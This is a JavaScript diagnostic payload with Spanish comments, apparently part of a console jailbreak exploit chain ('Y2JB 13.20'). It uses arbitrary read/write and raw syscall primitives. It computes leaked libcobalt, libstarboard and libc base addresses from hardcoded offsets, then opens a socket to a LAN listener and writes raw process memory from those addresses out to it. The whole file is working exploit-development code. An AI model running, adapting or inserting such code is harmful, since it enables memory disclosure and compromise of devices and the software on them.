// 2026-08-27 diag_raw3_1320: distinguir XOM vs leak-podrido (offsets obsoletos -> base falsa).
// Leaks Y2JB 13.20: cobalt=read64(stack+8)-0x7FA73F; sb=read64(cobalt+0x2483B20)-0x3D5D0; libc=read64(sb+0x52DBA0)-0x3AD00.
// Hechos: read64(libc_base)=SIGSEGV 3/3, write(sock,libc_base,32)=EFAULT => solo Sp (write kernel-side). UNICO read64: sb+0x52DBA0 (exploit ya lo hace).
(()=>{
const B=(x)=>BigInt(x),I=(x)=>BigInt.asIntN(64,x),WB=malloc(512);let sock=-1n;
const W=(s)=>{if(sock<0n)return;try{const t=String(s)+"\n";let n=t.length;if(n>511)n=511;for(let i=0;i<n;i++)write8(WB+BigInt(i),t.charCodeAt(i)&255);syscall(SYSCALL.write,sock,WB,BigInt(n));}catch(e){}};
const E=(n,s)=>W("[diag] PASO "+n+": "+s+" - ejecutando"),R=(n,v)=>W("[diag] PASO "+n+" result: "+v);
try{sock=I(syscall(SYSCALL.socket,2n,1n,0n));if(sock<0n)sock=-1n;else{const sa=malloc(16);write8(sa,16);write8(sa+1n,2);write16(sa+2n,0x911Fn);write32(sa+4n,0x4301A8C0n);write64(sa+8n,0n);const cr=I(syscall(SYSCALL.connect,sock,sa,16n));if(cr<0n){syscall(SYSCALL.close,sock);sock=-1n;}}}catch(e){sock=-1n;}
const Sp=(a,n)=>{const r=I(syscall(SYSCALL.write,sock,a,BigInt(n)));if(r<0n){let s="errno?";try{s=get_error_string()}catch(x){s="errstr EX "+x}return{d:"ERR "+s,f:/^14(\s|$)/.test(s)||/EFAULT/.test(s)}}return{d:"ok "+r+"B -> listener",f:false}};
E(1,"getpid baseline");try{const p=I(syscall(SYSCALL.getpid));R(1,"pid="+p)}catch(e){R(1,"EX "+e)}
E(2,"bases (typeof)");try{R(2,"cobalt="+(typeof libcobalt_base==="undefined"?"NO EXISTE":toHex(B(libcobalt_base)))+"|sb="+(typeof libstarboard_base==="undefined"?"NO EXISTE":toHex(B(libstarboard_base)))+"|libc="+(typeof libc_base==="undefined"?"NO EXISTE":toHex(B(libc_base))))}catch(e){R(2,"EX "+e)}
E(3,"CONTROL heap 0x41x8 al PC");try{const c=malloc(64);write64(c,0x4141414141414141n);const p=Sp(c,8);R(3,p.d+(p.f?" METODO ROTO":" ok"))}catch(e){R(3,"EX "+e)}
E(4,"Sp(cobalt+0,32) libcobalt p1");try{if(typeof libcobalt_base==="undefined")R(4,"SKIPPED");else{const a=B(libcobalt_base),p=Sp(a,32);R(4,toHex(a)+" -> "+p.d)}}catch(e){R(4,"EX "+e)}
E(5,"Sp(cobalt+0x2483B20,16) fuente leak sb");try{if(typeof libcobalt_base==="undefined")R(5,"SKIPPED");else{const a=B(libcobalt_base)+0x2483B20n,p=Sp(a,16);R(5,toHex(a)+" -> "+p.d)}}catch(e){R(5,"EX "+e)}
E(6,"Sp(sb+0,32) libstarboard p1");try{if(typeof libstarboard_base==="undefined")R(6,"SKIPPED");else{const a=B(libstarboard_base),p=Sp(a,32);R(6,toHex(a)+" -> "+p.d)}}catch(e){R(6,"EX "+e)}
E(7,"CLAVE Sp(sb+0x52DBA0,16) qword libc al PC");try{if(typeof libstarboard_base==="undefined")R(7,"SKIPPED");else{const a=B(libstarboard_base)+0x52DBA0n,p=Sp(a,16);R(7,toHex(a)+" -> "+p.d)}}catch(e){R(7,"EX "+e)}
E(8,"read64(sb+0x52DBA0) UNICO");try{if(typeof libstarboard_base==="undefined")R(8,"SKIPPED");else{const q=read64(B(libstarboard_base)+0x52DBA0n);R(8,"q="+toHex(q));R(8,"check: q-0x3AD00 == libc_base ? "+(typeof libc_base==="undefined"?"NO EXISTE":(q-0x3AD00n===B(libc_base))))}}catch(e){R(8,"EX "+e)}
E(9,"Sp(libc_base+0x3AD00,32)");try{if(typeof libc_base==="undefined")R(9,"SKIPPED");else{const a=B(libc_base)+0x3AD00n,p=Sp(a,32);R(9,toHex(a)+" -> "+p.d+(p.f?" NO LEGIBLE":""))}}catch(e){R(9,"EX "+e)}
E(10,"getpid+notificacion");try{const p=I(syscall(SYSCALL.getpid));R(10,"pid="+p);W("[diag] COMPLETO: consola viva");try{send_notification("[diag3] done")}catch(e){}}catch(e){R(10,"EX "+e)}
E(11,"close(sock)");try{if(sock>=0n)syscall(SYSCALL.close,sock);R(11,"sock "+sock+" closed")}catch(e){R(11,"EX "+e)}
})();
